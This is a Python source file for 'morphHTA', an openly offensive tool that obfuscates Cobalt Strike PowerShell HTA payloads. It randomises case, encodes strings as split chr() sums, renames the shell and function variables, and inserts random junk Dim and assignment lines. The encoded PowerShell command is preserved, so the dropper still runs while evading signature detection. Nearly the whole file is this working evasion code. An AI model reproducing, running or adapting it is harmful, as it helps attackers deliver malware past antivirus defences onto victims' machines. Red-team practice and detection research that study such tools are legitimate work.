import os;
import random;
import uuid; 
import string;
import sys;
import argparse;

class morphHTA(object):
	def __init__(self):
		self.args = None

	globalDim = []
	newlines = []

	def junkDim(self):
		myDim = self.givemeName()
		self.globalDim += [myDim]
		return self.obfuscate("Dim " + myDim)

	def junkSet(self):
		# choose a dim'd variable to mess with
		variable = self.globalDim[random.randint(0,len(self.globalDim)-1)]
		
		value = self.obfuscateNum(self.givemeString())

		final = variable + (" = %s" % value)

		return self.obfuscate(final)


	def obfuscate( self, line ):
		base = ""
		for i in line:
			value = ""
			if self.randbool():
				# uppercase it
				value = i.upper()
			else:
				# lowercase it
				value = i.lower()
			base += value
		return base

	def obfuscateNum( self, line ):
		'''
		base = ""
		for i in line:
			value = ord(i)
			randval = random.randint(0,255)
			result = value - randval
			base += "chr(%d+%d)&" % (randval, result)
		return base[:-1]
		'''
		base = "chr("
		for i in line:
			splitnum = random.randint(1,10)
			splits = []
			target = ord(i)
			maxvaluesplit = int(float(target)/splitnum)
			for i in range(0,splitnum):
				valuesplit = random.randint(0,int(self.args.maxnumsplit))
				splits += [valuesplit]
			value = sum(splits)
			result = target - value
			for i in splits:
				base += str(i) + "+"
			base += str(result)
			base += ")&chr("
		return base[:-5]

	def randbool(self):
		return (random.random() >= 0.5)

	def givemeString(self):
		majority = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(0,int(self.args.maxstrlen))))
		minor = ''.join(random.choice(string.ascii_uppercase) for _ in range(4))

		return self.obfuscate(minor + majority)

	def givemeName(self):
		majority = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(0,int(self.args.maxvarlen))))
		minor = ''.join(random.choice(string.ascii_uppercase) for _ in range(4))

		return self.obfuscate(minor + majority)

	def banner(self):
		with open('banner.txt', 'r') as f:
			data = f.read()

			print "\033[1;31m%s\033[0;0m" % data
			print "\033[1;34mMorphing Evil.HTA from Cobalt Strike"
			print "\033[1;32mAuthor: Vincent Yiu (@vysec, @vysecurity)\033[0;0m"

	def output(self):
		print "\033[1;33m[+] Writing payload to \033[1;31m%s\033[0;0m" % self.args.out
		f = open(self.args.out, "w+")
		self.newlines
		f.write('\n'.join(self.newlines))
		f.close()
		print "\033[1;33m[+] Payload written\033[0;0m"

	def make_argparser(self):
		parser = argparse.ArgumentParser(description = "")
		parser.add_argument("--in", metavar="<input_file>", dest = "infile", default = "evil.hta", help = "File to input Cobalt Strike PowerShell HTA")
		parser.add_argument("--out", metavar="<output_file>", dest = "out", default = "morph.hta", help = "File to output the morphed HTA to")
		parser.add_argument("--maxstrlen", metavar="<default: 1000>", dest = "maxstrlen", default = 1000, help = "Max length of randomly generated strings")
		parser.add_argument("--maxvarlen", metavar="<default: 40>", dest = "maxvarlen", default = 40, help = "Max length of randomly generated variable names")
		parser.add_argument("--maxnumsplit", metavar="<default: 10>", dest = "maxnumsplit", default = 10, help = "Max number of times values should be split in chr obfuscation")
		return parser

	def check_args(self, args):
		self.args = args

		if not os.path.isfile(self.args.infile):
			# not file exists
			sys.exit("\033[1;31m[*] The input file \033[1;33m%s\033[1;31m does not exist\033[0;0m" % self.args.infile)
		else:
			a = open(self.args.infile, 'r')
			bScript = False
			for line in a.readlines():
				if "script language" in line.lower():
					bScript = True

			if not bScript:
				sys.exit("\033[1;31m[*] HTA does not include a script, invalid Cobalt Strike PowerShell HTA file\033[0;0m")

	def run(self, args):

		self.banner()
		print ""

		m.check_args(args)

		print ""

		print "\033[1;32m[*] morphHTA initiated\033[0;0m"

		hta = open(self.args.infile,'r')
		lines = []

		for line in hta.readlines():
			lines += [line.strip()]

		# At this point, all lines are in
		# Let's look for strings
		
		# Sanitise first
		# var_shell
		# var_Func

		# 1) grab two random variable names for our lovely HTA
		newshell = self.givemeName()
		newfunc = self.givemeName()

		#print "NewShell: %s" % newshell
		#print "NewFunc: %s" % newfunc

		temp = []

		for line in lines:
			if "var_shell" in line:
				# if we find var_shell
				line = line.replace("var_shell", newshell)
			if "var_func" in line:
				# if we find var_func
				line = line.replace("var_func", newfunc)
			temp += [line]

		lines = temp

		for line in lines:
			passed = False
			if "script language" in line:
				passed = True
			if "\"" in line and not "VBScript" in line:
				if not "powershell" in line:
					line0 = line.split("\"")[0]
					line1 = line.split("\"")[1]
					line2 = line.split("\"")[2]
					line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line1))) + self.obfuscate(line2)
				else:
					# keep the base64 intact
					line0 = line.split("\"")[0]
					line1 = line.split("\"")[1]
					line11 = line1.split("encodedcommand ")[0]
					critical = line1.split("encodedcommand ")[1]
					line2 = line.split("\"")[2]
					line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + "encodedcommand ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)
			else:
				line = self.obfuscate(line)
			if not passed:
				for i in range(0,random.randint(0,100)):
					self.newlines += [self.junkDim()]
					self.newlines += [self.junkSet()]
				self.newlines += [line]
			else:
				self.newlines += [line]

		#output to text file
		self.output()


if __name__ == '__main__':
	m = morphHTA()
	parser = m.make_argparser()
	arguments = parser.parse_args()
	m.run(arguments)
